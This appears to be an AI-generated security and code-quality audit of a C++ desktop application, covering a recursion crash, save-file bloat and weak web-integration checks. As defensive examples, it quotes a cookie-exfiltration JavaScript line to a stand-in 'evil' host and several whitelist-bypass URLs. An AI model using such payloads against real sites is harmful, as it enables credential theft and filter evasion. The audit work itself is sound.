# Earthcall — Repository Audit

Date: 2026-07-28
Commit audited: `58ef81d` ("save system")
Auditor: automated review (Claude Code)

---

## 1. Scope and method

Everything tracked in this repository was in scope:

| Component | What it is | Hand-written size |
|---|---|---|
| `sight-cpp/` | The Earthcall application — C++17, OpenGL 2 + Dear ImGui, macOS-only | 259 files, **49,207 LOC** |
| `sight-cpp/tests/` | 24 assertion-based test programs | 4,620 LOC |
| `sight-cpp/docs/` | 20 architecture/design documents | 7,278 lines |
| `src/Legacy Depricated/` | Superseded single-file prototype | 1,670 LOC (dead) |
| `backend-python/` | Flask "Dimension of Thought" web stub + a desktop-automation agent | 107 LOC |
| `TestLab/`, `TestLabAI/` | Scratch projects (menu prototype, toy n-gram LM) | ~2,500 LOC |
| `imgui/`, `third_party/wgpu/` | Vendored dependencies | — |
| `venv/` | A committed Python 3.9 virtualenv | — |

Method:

* Static reading of the source, concentrated on the subsystems touched by the
  last ~15 commits (law/creation system, save system, WebGPU backend).
* **Full compiler pass.** The project's real build needs macOS frameworks, so a
  Linux equivalent was reconstructed: `glm` and `GLFW` headers were fetched,
  Mesa GL headers installed, and `<OpenGL/gl.h>` shimmed to `<GL/gl.h>`. Every
  `.cpp` under `src/` (excluding the WebGPU and Legacy trees) was then compiled
  with the project's own `-std=c++17 -Wall -Wextra`. **123 of 124 translation
  units compile clean**; the warning and error tallies below are from that run,
  not from guesswork.
* **Dynamic verification** where a claim was falsifiable: the `SecurityManager`
  crash in §2.1 was reproduced by compiling that translation unit and running it
  under `gdb`.
* Save-file analysis on the real artifacts in `sight-cpp/saves/`.

What was *not* verified: nothing was linked or run end-to-end, because
`RealWebView.cpp`/`WebIntegration.cpp` are Objective-C++ against WebKit/Cocoa and
the link line needs `-framework OpenGL -framework WebKit -framework Cocoa`. The
test suite could not be executed for the same reason. Rendering, audio and the
WebGPU backend were read but not exercised.

---

## 2. Findings

Ordered by severity. Each finding says how it was established.

### 2.1 — CRITICAL: `SecurityManager::logEvent` recurses infinitely and crashes the process

**File:** `sight-cpp/src/Integration/SecurityManager.cpp:389-421`, `:456-480`
**Status: reproduced — segmentation fault.**

`logEvent()` ends by calling `detectSuspiciousActivity(source)`; if that returns
true it calls `blockSource(source)`; `blockSource()` calls `logEvent()` again.
Nothing in that cycle changes the condition that made `detectSuspiciousActivity`
return true, so it never terminates:

```
logEvent()                       // SecurityManager.cpp:408
  └─ detectSuspiciousActivity()  // true once _sourceActivityCount[source] > 100
       └─ blockSource()          // SecurityManager.cpp:479
            └─ logEvent()        // …and around again, forever
```

`_sourceActivityCount[source]` is incremented on every `logEvent` and **is never
decremented or reset** — despite the comment on line 459 reading *"Block if more
than 100 events in 1 minute"*, there is no time window at all. It is a lifetime
counter.

Reproduction (compiled `SecurityManager.cpp` with a stub `SaveSystem`, then 200
benign `logEvent` calls from one source):

```
Program received signal SIGSEGV, Segmentation fault.
#40271 Integration::SecurityManager::logEvent (…, description="Source blocked due to
       suspicious activity", source="https://example.com") at SecurityManager.cpp:409
#40272 Integration::SecurityManager::blockSource (…) at SecurityManager.cpp:479
#40273 Integration::SecurityManager::logEvent (…) at SecurityManager.cpp:409
   … 40,000 frames …
#40290 main ()
```

**Impact.** Every public entry point on this class logs: `validateURL`,
`validateMessage`, `requestPermission`, `grantPermission`, `setSecurityLevel`.
The 101st web-integration message from any single origin — an entirely normal
volume for an embedded WebView — takes down the whole application via stack
exhaustion. The security layer is the crash.

**Fix.** Break the cycle and give the counter a window:

```cpp
void SecurityManager::blockSource(const std::string& source) {
    if (!_blockedSources.insert(source).second) return;   // already blocked: no re-log
    logEvent(SecurityEventType::SUSPICIOUS_ACTIVITY,
             "Source blocked due to suspicious activity", source);
}
```

and reset `_sourceActivityCount[source]` on the same 60-second boundary that
`_checkRateLimit` already computes (`SecurityManager.cpp:723-734`), so
"100 events in 1 minute" means what the comment says. Add a regression test —
there is currently no test of any kind for `SecurityManager`.

---

### 2.2 — HIGH: whitelist can be bypassed by any attacker-controlled domain

**File:** `sight-cpp/src/Integration/SecurityManager.cpp:188-199`

```cpp
for (const auto& domain : _config.whitelistedDomains) {
    if (url.find(domain) == 0) return true;      // prefix match on the whole URL
}
```

This is a string-prefix test, not a host comparison. With the PARANOID-level
default whitelist `{"https://trusted.earthcall.com"}` (set at line 105), all of
these pass:

* `https://trusted.earthcall.com.attacker.example/` — attacker's domain
* `https://trusted.earthcall.com@attacker.example/` — userinfo trick
* `https://trusted.earthcall.com-evil.example/`

The blacklist at `:201-208` has the mirror problem: it substring-matches
anywhere in the URL, so a blacklist entry `evil.com` also blocks the benign
`https://example.org/?ref=evil.com`, while `https://evil.com.` (trailing dot,
still resolves) is a trivial evasion.

**Fix.** Parse the URL, extract the host, and compare hosts exactly or by
label-boundary suffix (`host == d || endsWith(host, "." + d)`). Do not match
against the raw URL string.

---

### 2.3 — HIGH: `validateJavaScript` does not detect malicious JavaScript

**File:** `sight-cpp/src/Integration/SecurityManager.cpp:517-534`, `:704-721`

`validateJavaScript` returns `false` only when a `_maliciousPatterns` entry
matches. Those five patterns are **HTML** patterns — `<script…></script>`,
`<iframe`, `onload=`, `onerror=`, `javascript:…;` — applied to a **JavaScript
source string**. Ordinary malicious JS (`fetch('//evil/'+document.cookie)`,
`new Function(payload)()`, `localStorage.clear()`) matches none of them, so the
function returns `true`.

The patterns that *would* be relevant — `eval\s*\(`, `document\.write` — are in
`_suspiciousPatterns`, and the suspicious loop at `:527-531` only **logs**; it
never affects the return value.

Additionally, `<script[^>]*>.*?</script>` cannot match across lines: in
`std::regex`'s default ECMAScript grammar `.` does not match a newline, so any
multi-line `<script>` block slips past even the HTML check.

`sanitizeJavaScript` (`:536-554`) has the same problem from the other side. It
rewrites `eval(` to `// BLOCKED: eval(` — splicing a line comment into the
middle of an expression, which corrupts the surrounding program rather than
neutralising it — and it is defeated by `window['ev'+'al']`. The `pos += 15`
on line 549 is also wrong: `"// BLOCKED: "` is 12 characters, not 15, so the
scan skips three characters of real content after each substitution.

**Recommendation.** Treat this as unimplemented rather than weak. Blocklist
sanitising of a Turing-complete language does not work; the defence that does is
the one already available here — origin restriction plus a real CSP. Delete
`sanitizeJavaScript`, and have `validateJavaScript` either enforce an
allowlist of known-good scripts or be honest and always return `true` at a
documented trust boundary.

---

### 2.4 — MEDIUM: the CSP and sandbox policies negate themselves

**File:** `sight-cpp/src/Integration/SecurityManager.cpp:361-387`

* `generateCSP` emits `script-src 'self' 'unsafe-inline'`. `'unsafe-inline'`
  re-permits exactly the inline-script injection CSP exists to stop; the
  directive provides close to no XSS protection as written.
* `generateSandboxPolicy` returns `allow-scripts allow-same-origin`. That pair
  is well known to be self-defeating: a frame with both can reach into its
  parent's origin and remove its own `sandbox` attribute.

Neither is a bug in the code's own terms — both do what they say — but the
`docs/architecture/SECURITY_FEATURES.md` claims a protection level these values
do not deliver.

---

### 2.5 — HIGH (data): every save file is roughly 800× larger than its content

**Files:** `sight-cpp/src/Singularity/Core/GameSaveLoad.cpp:55-172`,
`sight-cpp/src/Util/Serialization.cpp:233-248`

Measured on `saves/games/20260727_200003_QuickSave.json` — **80 MB** for a world
of 290 objects and 5 zones. Three compounding causes:

**(a) The object list is serialized twice.** `buildSaveJson()` writes every
zone's world at line 72 (`zj["world"] = z.world()`, which serializes that zone's
objects). `saveStateWithLog()` then writes the *active* zone's objects a second
time at line 172 (`j["objects"] = objArr`). Verified in the file: 290 object IDs
under `objects`, the same 290 (plus the 2 baseline objects) under
`zones[0].world.objects`, a 100% overlap.

**(b) The second copy is never read.** `loadState` reads `zones[*].world`
(`GameSaveLoad.cpp:266-268`) and reads no top-level `objects` key anywhere. The
only other `from_json` that consumes an `"objects"` array is
`Serialization.cpp:626`, and that one operates on the `World` object *inside*
`zj["world"]`. **38 MB of every timestamped save is write-only data.**

**(c) Face textures are stored raw, per object, with no deduplication.**
`Serialization.cpp:234` writes all six faces of every object as base64 RGBA8
whenever `faceTextures` is non-empty — there is no dirty flag and no "is this
still the default?" check. Each face is 64×64×4 bytes → 21,848 base64
characters; six faces → **131 KB per object**, before any of the object's actual
state.

The redundancy is near-total. Hashing all 1,740 stored face textures in that
save:

```
total faces: 1740   distinct textures: 3
  d73bb2a4455f  ×580
  f032d7e12182  ×580
  6eef4b69d64b  ×580
```

**Three** distinct 4 KB images, written out 1,740 times, for 38 MB per copy and
76 MB across both copies.

**Impact.** Saving and loading are I/O-bound on data with no information in it;
`saves/` has reached 1.9 GB across 318 files (see §2.9); the two largest saves in
history are 102 MB each.

**Fix**, in increasing order of effort and payoff:

1. Delete the `j["objects"] = objArr` block at `GameSaveLoad.cpp:163-172`.
   Nothing reads it. Halves every save immediately.
2. Skip serializing a face texture that still equals its default — a dirty bit
   set by the paint path, or a comparison against the geometry's default fill.
3. Content-address textures: hash each texture, write a top-level
   `"textures": { "<hash>": {...} }` pool, and store the hash on the face. On
   the measured save that is 1,740 references plus 3 payloads — roughly 12 KB
   in place of 76 MB.

---

### 2.6 — MEDIUM: six action types exist, are tested, are persisted, and cannot be authored

**File:** `sight-cpp/src/Rendering/LawGraphWindow.cpp:997-1010`

`ActionNode::Kind` (`src/ZonesOfEarth/AuthorsOfLaw/ActionModel.hpp:24-47`) has
**17** values. The Law Graph editor's dropdown lists **11**:

```cpp
static const char* kinds[] = {"set", "add", "scale", "lerp", "drive (curve)",
                              "sequence", "parallel", "spawn concept", "map (math)",
                              "flow (rate of change)", "publish event"};
if (ImGui::Combo("Action type", &kind, kinds, 11)) { … }
```

`Create` (11), `AddProperty` (12), `AddElement` (13), `RemoveProperty` (14),
`RemoveElement` (15) and `Destroy` (16) are missing. These are the newest
feature in the codebase — the creation/destruction verbs from
`52ec7f4 "augmented law system"` — and they are fully implemented in the model,
serialized by `ActionModel.cpp`, and covered by `tests/law_creation_test.cpp`.
There is simply no way for a user to reach them.

The compiler already says so. `-Wswitch` on `editActionNode`:

```
LawGraphWindow.cpp:1010: warning: enumeration value 'Create' not handled in switch
LawGraphWindow.cpp:1010: warning: enumeration value 'AddProperty' not handled in switch
LawGraphWindow.cpp:1010: warning: enumeration value 'AddElement' not handled in switch
LawGraphWindow.cpp:1010: warning: enumeration value 'RemoveProperty' not handled in switch
LawGraphWindow.cpp:1010: warning: enumeration value 'RemoveElement' not handled in switch
LawGraphWindow.cpp:1010: warning: enumeration value 'Destroy' not handled in switch
```

A secondary consequence: a law loaded from a save that *does* use one of these
kinds passes an out-of-range index to `ImGui::Combo`. ImGui guards the read
(`imgui_widgets.cpp:2124`), so this does not crash — but the dropdown renders
blank and `editActionNode`'s switch draws no editor body, so the action becomes
invisible and silently uneditable in the UI.

The neighbouring condition editor at `LawGraphWindow.cpp:626-634` lists all 14
of its enum's values, so this is a single stale array, not a systemic pattern.

**Fix.** Extend `kinds[]` to 17 entries, pass `17` to `ImGui::Combo`, and add the
six `case` labels to the switch. Consider `static_assert` on the array length
against the enum's last value so the next addition cannot drift.

---

### 2.7 — MEDIUM: `backend-python/app.py` is not valid Python

**File:** `backend-python/app.py:9`

```python
@app.route('/')
def home():
    return render_template('index.html'     # ← unclosed paren
```

```
SyntaxError: '(' was never closed
```

The module cannot be imported, so the Flask app has never started in its current
state. Three further defects sit behind it, all of which will bite the moment
the paren is closed:

* **`app.run(debug=True)`** (line 16). The Werkzeug debugger exposes an
  interactive Python console on unhandled exceptions — remote code execution for
  anyone who can reach the port. Never ship this; gate it on an env var.
* **`static/app.js:6`** calls `response.text()` and then reads `data.message` on
  the resulting string. `.message` on a `String` is `undefined`, so the page
  always renders "undefined". Should be `response.json()`.
* **`templates/index.html:7`** links `href="style.css"`, a path Flask does not
  serve — it 404s. Should be
  `{{ url_for('static', filename='style.css') }}`, matching the `app.js` tag
  three lines below it that already does this correctly.

There is also **no `requirements.txt`** anywhere in the repository. Dependencies
are pinned only by the committed `venv/`, which contains Flask but *not* the
`pygetwindow`, `pyautogui` or `playwright` that `agent/earthcall_agent.py`
imports at module scope — so that script cannot run against the checked-in
environment either.

---

### 2.8 — LOW: `AdvancedFacePaint.hpp` is not self-contained

**File:** `sight-cpp/src/OurVerse/AdvancedFacePaint.hpp:74`

```
AdvancedFacePaint.hpp:74:21: error: field 'message' has incomplete type 'std::string'
```

`PaintResult::message` is a `std::string`, but the header includes only
`<glm/glm.hpp>`, `<vector>` and `<memory>`. It compiles today only because
`AdvancedFacePaint.cpp` happens to pull in `<string>` transitively first. This
is the **only** compile failure in the entire 124-file source tree — everything
else builds clean under `-Wall -Wextra`. One `#include <string>` fixes it.

---

### 2.9 — HIGH (hygiene): 99.7% of this repository is generated output

Of **2,481 MB** tracked at `HEAD`, hand-written source and documentation account
for **7.7 MB**:

| Category | Size | Files |
|---|---:|---:|
| `sight-cpp/saves/` — runtime save data | **1,899.4 MB** | 330 |
| `sight-cpp/build/` — `.o` / `.d` objects | **272.8 MB** | 283 |
| Compiled executables (`earthcall`, 20 `*_test`, …) | **161.2 MB** | 32 |
| `*.dSYM` debug bundles | **69.9 MB** | 3 |
| Stray `.o` / `.a` at various paths | 37.8 MB | 19 |
| `venv/` — a committed Python virtualenv | 10.1 MB | 827 |
| `imgui/` + `third_party/` — vendored deps | 7.3 MB | 247 |
| `.DS_Store` | — | 13 |
| **Hand-written source, tests and docs** | **7.7 MB** | **354** |

The single largest tracked blob is
`saves/games/20250811_121616.json` at **102 MB**; there is a second 102 MB save
beside it, and seven more above 39 MB.

There is **no `.gitignore` at the repository root**. The only ignore file is
`sight-cpp/.gitignore`, whose five lines cover one `.dylib` and four WebGPU
smoke-test binaries — the four binaries that happen not to be committed, while
the twenty that are go unmentioned.

Because git stores every historical version of these files, this is why the pack
is 240 MB and a fresh clone is slow. Note that the 1.9 GB of saves is *user data
generated by running the program*, not source: it does not belong under version
control at all.

**Recommendation.**

1. Add a root `.gitignore`:
   ```gitignore
   .DS_Store
   build/
   *.o
   *.d
   *.dSYM/
   venv/
   sight-cpp/saves/
   # committed binaries
   sight-cpp/earthcall
   sight-cpp/*_test
   sight-cpp/test_parse*
   ```
2. `git rm -r --cached` the above, commit, and add a `requirements.txt` in place
   of `venv/`.
3. Keep one or two small representative saves as fixtures if the test suite
   needs them (`serialization_compat_test` may) — under `tests/fixtures/`, not
   `saves/`.
4. Purging the history (`git filter-repo`) would take the clone from ~240 MB to
   a few MB, but rewrites every hash. Worth doing while the project has a single
   contributor; the cost only grows.

---

### 2.10 — MEDIUM: the project builds on exactly one machine

**File:** `sight-cpp/Makefile:26-42`

Include and library paths are hard-coded to a specific Homebrew layout, down to
the GLFW point release:

```make
-I/opt/homebrew/Cellar/glfw/3.4/include
-L/opt/homebrew/Cellar/lib          # ← this path does not exist; see below
-framework OpenGL -framework WebKit -framework Cocoa -framework CoreAudio
```

Consequences:

* Apple Silicon macOS only. Intel macs use `/usr/local`, not `/opt/homebrew`.
* A GLFW upgrade to 3.5 silently breaks the include path.
* `-L/opt/homebrew/Cellar/lib` is not a real directory — Homebrew's `Cellar`
  holds per-formula subdirectories. The link only works because the following
  `-L/opt/homebrew/lib` is correct; the first flag is dead and misleading.
* `RealWebView.cpp` and `WebIntegration.cpp` are Objective-C++ against WebKit,
  so no non-Apple port is possible without stubbing that layer.

`pkg-config --cflags --libs glfw3` in place of the hard-coded paths removes the
version pin and the Intel/ARM split at no cost. Guarding the WebKit layer behind
`#ifdef __APPLE__` with a no-op fallback would make Linux CI possible — which
matters, because of §2.12.

A related latent trap: `SOURCES` is built with
`$(shell find $(SRC_DIR) -name "*.cpp" …)` (line 62) and `src/` contains a
directory with a space in its name, `Legacy Depricated/`. Make splits `$(shell)`
output on whitespace, so any `.cpp` added under that directory would produce two
bogus targets, `src/Legacy` and `Depricated/foo.cpp`. It is harmless today only
because that directory's single `.cpp` is named `main.cpp` and is filtered out by
`\! -name "main.cpp"`.

---

### 2.11 — LOW: `tests/frontier_test.cpp` is never compiled

132 lines and 8 assertions with no target in the Makefile and no entry in the
aggregate `test` goal (line 288). It is dead — either wire it up or delete it.

---

### 2.12 — MEDIUM: no CI, no README, no license

The repository has no `.github/`, no CI configuration of any kind, no README at
the root or in `sight-cpp/`, and no license file. There are 24 test programs
and ~680 assertions — real, and well aimed at the law/ontology core — but
nothing runs them except a human typing `make test`, which is also the only way
anyone would learn they exist. The `-Wswitch` warnings in §2.6 have been sitting
in the build output through at least one release of the feature they describe.

Absent a license, the default is exclusive copyright: nobody may legally copy,
modify or contribute. If that is intentional, fine; if not, add one.

---

### 2.13 — Latent: the EventBus starts a worker thread it never uses

**File:** `sight-cpp/src/Singularity/Core/EventBus.cpp:8-12`, `:58-72`

`EventBus`'s constructor spawns a worker thread to drain the async queue.
`publishAsync` is the only thing that fills that queue, and it is called from
exactly one place — `EventHandler::publishAsync` (`EventHandler.hpp:55`) — which
nothing in `src/`, `tests/` or `examples/` calls. The thread blocks on the
condition variable for the process's lifetime.

Two things follow:

* `EventBus::shutdown()` is never called; the thread is joined by the static
  destructor at exit, whose ordering against other function-local statics is
  unspecified. Benign while the queue is always empty; a real shutdown hazard the
  first time it is not.
* The moment `publishAsync` acquires a caller, listeners begin running on the
  worker thread. Listeners mutate `Object`, `Zone` and `World` state, none of
  which is guarded by any lock. Synchronous `publish` (`EventBus.hpp:84-102`) is
  correct and is what the codebase actually uses.

**Recommendation.** Either delete the async path and the thread, or document
that listeners must be thread-safe before the first `publishAsync` caller lands.
Deleting is the honest option today.

---

### 2.14 — Housekeeping

* **`src/Legacy Depricated/`** — 1,670 lines of superseded prototype plus a
  committed 1.1 MB `main.o`. It is excluded from the build but is still indexed
  by every grep and every editor. Delete it; git remembers. (Also note the
  spelling: "Depricated".)
* **`src/Integration/EarthcallAPI.cpp` and `RealWebView.cpp`** carry 40
  `TODO` markers between them — 55% of the 73 in the entire source tree — nearly
  all of the form
  `// TODO: Connect to actual BrushSystem when available`. The web-integration
  layer is a facade returning canned success responses;
  `docs/core/INTEGRATION_GUIDE.md` should say so, or callers will believe it.
* **Relative save paths.** `GameSaveLoad.cpp:42` opens
  `"saves/earthcall-io.log"` relative to the process working directory, so
  launching the binary from anywhere but `sight-cpp/` silently discards the I/O
  log. `SaveSystem::ensureSaveFolder()` has the same dependency.
* **`.gitattributes`** sets `* text=auto` with no `binary` exceptions. Git's NUL
  heuristic keeps the committed `.o`/`.a`/executables safe today, but the
  combination is fragile — add `*.o binary`, `*.a binary` if those files are
  going to stay tracked (they should not; see §2.9).
* **Minor `base64Decode` nit** (`Serialization.cpp`): padding is counted as
  `if (s[len-1]=='=') pad++; if (s[len-2]=='=') pad++;` — two independent tests,
  so malformed input like `"AB=C"` yields `pad == 1` and a wrong output length.
  The decoder is otherwise correct and safely bounded; it validates every
  character and rejects bad input.
* **Compiler warnings**, whole tree, `-Wall -Wextra`: 59 `-Wunused-parameter`,
  6 `-Wswitch` (all §2.6), 5 `-Wmisleading-indentation`, 2 `-Wunused-variable`,
  2 `-Wunused-but-set-variable`, 2 `-Wcomment`, 1 `-Wsign-compare`,
  1 `-Wunused-result`. The `-Wunused-result` one is real:
  `SecurityManager.cpp:340` discards `nlohmann::json::parse`'s return value —
  harmless, since only the exception is wanted, but `(void)` it to keep the
  build quiet. That is a genuinely low warning count for 49 kLOC.

---

## 3. What is in good shape

The negative findings above are concentrated in two places — the integration
layer and repository hygiene. The core is not like that, and it is worth saying
so plainly:

* **The build is clean.** 123 of 124 translation units compile without error and
  with a handful of warnings under `-Wall -Wextra`. For 49 kLOC of hand-written
  C++ with heavy template and JSON use, that is a good result.
* **The Makefile's own comments are unusually good.** The `-O2` rationale at
  lines 11-18 cites a measured 35× speedup on the geometry kernels, explains why
  `-g` stays in release, and explains why `-DNDEBUG` is deliberately absent
  (the tests assert). Header-dependency tracking via `-MMD -MP` is present and
  correctly explained. Someone thought about this.
* **The law/ontology core is genuinely tested.** ~680 assertions across 24
  programs, weighted toward the hard parts — `ontomath_test` (91),
  `property_bridge_test` (84), `continuous_law_test` (77), `object_concept_test`
  (54), `time_flow_test` (53). Serialization round-trips are covered.
* **The save loader degrades gracefully.** The `stage(name, fn)` helper
  (`GameSaveLoad.cpp:220-228`) isolates each load phase, records what failed, and
  continues, so one corrupt subsystem does not lose the whole world. The ordering
  constraints — `ensureHomeZone()` before `switchTo` because the zone vector may
  reallocate (lines 281-285); the world clock before the laws so "laws never see
  time run backward" (line 372) — are commented at the point where they matter.
* **`base64Decode` is written defensively**, validating every character and
  bounding its output, which is exactly right for data that arrives from disk.
* **20 architecture documents, 7,278 lines.** Sparse for a project this size in
  places, but the design intent of the law system, the event bus, and the
  save-format migration is written down.

---

## 4. Suggested order of work

| # | Item | § | Effort |
|---|---|---|---|
| 1 | Fix the `logEvent`/`blockSource` recursion | 2.1 | minutes |
| 2 | Delete `j["objects"]` from `saveStateWithLog` | 2.5(a) | minutes |
| 3 | Add a root `.gitignore`; untrack `build/`, `saves/`, binaries, `venv/` | 2.9 | ~1 hour |
| 4 | Close the paren in `app.py`; drop `debug=True`; add `requirements.txt` | 2.7 | minutes |
| 5 | Extend the action-kind dropdown to 17; add the six `case`s | 2.6 | ~1 hour |
| 6 | Host-based whitelist matching | 2.2 | ~1 hour |
| 7 | Skip default face textures; then content-address the texture pool | 2.5(b,c) | ~1 day |
| 8 | `pkg-config` for GLFW; `#ifdef __APPLE__` around the WebKit layer | 2.10 | ~half a day |
| 9 | GitHub Actions running `make test`; README; license | 2.12 | ~half a day |
| 10 | Decide the honest scope of `validateJavaScript`/`sanitizeJavaScript` | 2.3 | design call |
| 11 | Delete `Legacy Depricated/`, wire up or delete `frontier_test.cpp` | 2.11, 2.14 | minutes |

Items 1-4 are small, independent, and remove the two failures that stop things
working outright plus the two worst sources of bloat.
